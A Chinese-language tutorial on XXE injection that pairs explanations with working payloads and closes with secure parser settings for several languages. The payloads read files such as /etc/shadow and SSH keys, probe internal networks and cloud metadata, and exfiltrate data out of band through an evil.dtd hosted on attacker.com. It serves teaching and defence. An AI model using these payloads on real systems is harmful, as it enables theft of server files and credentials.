XXE - XML 外部实体注入

HIGH XXE (XML External Entity) 攻击利用 XML 解析器处理外部实体的功能，读取服务器文件、进行 SSRF、甚至执行远程代码。

一句话理解 XXE

XML 有一个"引用外部资源"的功能（外部实体），如果解析器没有禁用这个功能，攻击者就可以让服务器去读取任意文件或访问任意URL。

1. XXE 概述

1.1 哪里会遇到 XML

  • SOAP Web Services：老式 Web 服务使用 XML 通信
  • REST API：某些 API 同时支持 JSON 和 XML（Content-Type: application/xml）
  • 文件上传：SVG 图片、DOCX/XLSX/PPTX（本质是 ZIP 内含 XML）
  • RSS/Atom feeds：新闻聚合
  • SAML：单点登录的 XML 断言
  • 配置文件：web.xml, pom.xml 等

2. XML 基础知识

2.1 XML 文档结构

<?xml version="1.0" encoding="UTF-8"?>   <!-- XML声明 -->
<!DOCTYPE note [                          <!-- DTD(文档类型定义) -->
  <!ENTITY greeting "Hello World">        <!-- 内部实体定义 -->
]>
<note>                                    <!-- 根元素 -->
  <to>Alice</to>
  <from>Bob</from>
  <message>&greeting;</message>           <!-- 引用实体 → "Hello World" -->
</note>

2.2 XML 实体类型

类型定义方式用途安全风险
内部实体<!ENTITY name "value">文本替换（类似宏）低（Billion Laughs DoS）
外部实体<!ENTITY name SYSTEM "URI">引用外部资源高！XXE攻击核心
参数实体<!ENTITY % name "value">DTD内部使用Blind XXE 利用

3. DTD 与外部实体

3.1 外部实体的正常用途

<!-- 外部实体引用本地文件 -->
<!DOCTYPE doc [
  <!ENTITY copyright SYSTEM "file:///var/www/copyright.txt">
]>
<doc>&copyright;</doc>

<!-- 外部实体引用远程资源 -->
<!DOCTYPE doc [
  <!ENTITY data SYSTEM "http://example.com/data.xml">
]>
<doc>&data;</doc>

3.2 支持的协议

协议支持的解析器利用方式
file://所有读取本地文件
http://所有SSRF、数据外带
https://所有同http
ftp://部分数据外带（绕过HTTP限制）
php://PHP读取PHP源码(filter)、RCE(expect)
jar://Java读取JAR内文件
gopher://Java (旧版)发送任意TCP数据
expect://PHP(需扩展)直接执行系统命令

4. XXE 攻击类型

4.1 经典 XXE：读取文件

<!-- 攻击者提交的XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- 服务器解析后，&xxe; 被替换为 /etc/passwd 的内容 -->
<!-- 如果应用返回了 name 字段的值 → 文件内容泄露！ -->

<!-- 读取其他敏感文件 -->
file:///etc/shadow          (密码哈希)
file:///etc/hosts           (内网信息)
file:///proc/self/environ   (环境变量，可能含密码)
file:///home/user/.ssh/id_rsa  (SSH私钥)
file:///var/www/html/config.php (数据库密码)
file:///C:/Windows/system32/drivers/etc/hosts (Windows)

4.2 XXE 实现 SSRF

<!-- 利用XXE访问内网服务 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<data>&xxe;</data>

<!-- 探测内网端口 -->
<!ENTITY xxe SYSTEM "http://10.0.0.1:22">   (SSH)
<!ENTITY xxe SYSTEM "http://10.0.0.1:3306"> (MySQL)
<!ENTITY xxe SYSTEM "http://10.0.0.1:6379"> (Redis)

<!-- 访问云元数据 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

4.4 PHP 特有利用

<!-- 使用 php://filter 读取PHP源码（Base64编码输出，避免解析错误）-->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
]>
<data>&xxe;</data>

<!-- 返回 Base64 编码的 PHP 源码（包含数据库密码等）-->
<!-- 解码: echo "PD9waHAK..." | base64 -d -->

<!-- 使用 expect:// 执行命令（需要expect扩展）-->
<!ENTITY xxe SYSTEM "expect://id">

5. Blind XXE（无回显）

当应用不回显实体内容时（最常见的情况），需要使用带外（OOB）技术将数据外带。

5.1 OOB XXE 通过 HTTP

Blind XXE 数据外带流程： Step 1: 攻击者在自己服务器上放置恶意 DTD 文件 http://attacker.com/evil.dtd Step 2: 攻击者提交XML，引用外部DTD 目标服务器 → 加载 evil.dtd → 执行其中定义的实体 Step 3: evil.dtd 让目标服务器读取文件，并通过HTTP请求发送给攻击者 目标服务器 → http://attacker.com/?data=[文件内容] 攻击者 目标服务器 攻击者DTD服务器 | | | |-- 提交含XXE的XML -------->| | | |-- 加载外部DTD ---------->| | |<-- 返回evil.dtd ---------| | | | | | (解析DTD，读取本地文件) | | | | |<-- HTTP请求带文件内容 -----| | | ?data=root:x:0:0:... | |

5.2 OOB XXE Payload

<!-- 提交给目标的 XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>

<!-- attacker.com/evil.dtd 的内容 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- 执行流程:
  1. %xxe 加载远程DTD
  2. %file 读取 /etc/passwd
  3. %eval 定义新实体 %exfil，其URL包含文件内容
  4. %exfil 发送HTTP请求到攻击者服务器
  5. 攻击者从访问日志中获取文件内容
-->

5.3 OOB XXE 通过 FTP

<!-- 当HTTP外带因为特殊字符失败时，使用FTP -->
<!-- FTP可以传输多行数据 -->

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;

<!-- 攻击者运行FTP服务器接收数据 -->
# Python 简易FTP接收
# 或使用 xxeserv 等专用工具

5.4 基于错误的 XXE

<!-- 利用解析错误信息泄露数据 -->
<!-- 当服务器返回详细错误信息时有效 -->

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- 错误信息可能包含:
  "Failed to open file:///nonexistent/root:x:0:0:root:/root:/bin/bash..."
  → 文件内容出现在错误消息中！
-->

6. 实际利用场景

6.1 通过 SVG 文件上传触发 XXE

<!-- 上传恶意SVG图片 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- 如果服务器解析SVG（缩略图生成、格式验证等）→ XXE触发 -->

6.2 通过 Office 文档（DOCX/XLSX）

# DOCX/XLSX 本质上是ZIP文件，内含多个XML
# 修改步骤：

# 1. 解压 DOCX
unzip document.docx -d doc_extracted

# 2. 修改其中的 XML 文件（如 word/document.xml）
# 在 XML 头部添加恶意 DTD

# 3. 重新打包
cd doc_extracted && zip -r ../malicious.docx .

# 目标：上传简历→HR系统解析DOCX→触发XXE→读取服务器文件

6.3 Content-Type 切换

# 即使 API 通常接收 JSON，也可能同时支持 XML

# 正常请求
POST /api/user HTTP/1.1
Content-Type: application/json
{"name": "alice", "email": "alice@example.com"}

# 切换为 XML（测试是否支持）
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>

# 如果服务端框架自动根据 Content-Type 选择解析器 → XXE!

6.4 SAML XXE

<!-- SAML Response 是 XML 格式，用于单点登录 -->
<!-- 如果 IdP/SP 的 SAML 解析器未禁用外部实体 -->

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

7. XXE 防御

核心防御：禁用外部实体

几乎所有 XML 解析器都提供禁用外部实体的选项。禁用它就是最有效的防御。

7.1 各语言/解析器的安全配置

# Python - defusedxml（推荐）
import defusedxml.ElementTree as ET
tree = ET.parse('data.xml')  # 自动防御XXE

# Python - 手动配置 lxml
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,    # 禁用实体解析
    no_network=True,           # 禁止网络访问
    dtd_validation=False,      # 不加载DTD
    load_dtd=False
)
tree = etree.parse('data.xml', parser)

# ──────────────────────────────────────────────

// Java - DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);  // 最安全
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// ──────────────────────────────────────────────

// PHP - libxml
libxml_disable_entity_loader(true);  // PHP < 8.0
// PHP 8.0+ 默认禁用外部实体

// 使用 SimpleXML 时
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
// ❌ 上面是不安全的！LIBXML_NOENT 会展开实体

// ✅ 安全方式
$xml = simplexml_load_string($data);  // 不传危险flag

// ──────────────────────────────────────────────

// .NET
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // 禁止DTD
settings.XmlResolver = null;  // 不解析外部引用

// ──────────────────────────────────────────────

// Node.js - 大多数解析器默认安全
// 但如果使用 libxmljs:
const libxmljs = require('libxmljs');
const doc = libxmljs.parseXml(xml, { noent: false, nonet: true });

7.2 防御清单

措施效果优先级
禁用外部实体和DTD处理根本性防御最高
使用 JSON 替代 XML消除攻击面高（新项目）
升级 XML 解析库新版本通常默认更安全高
输入验证（白名单）过滤 DOCTYPE/ENTITY中（辅助）
WAF 规则拦截含 ENTITY/DOCTYPE 的请求中（可绕过）
文件上传验证检查SVG/Office文件中的XXE高
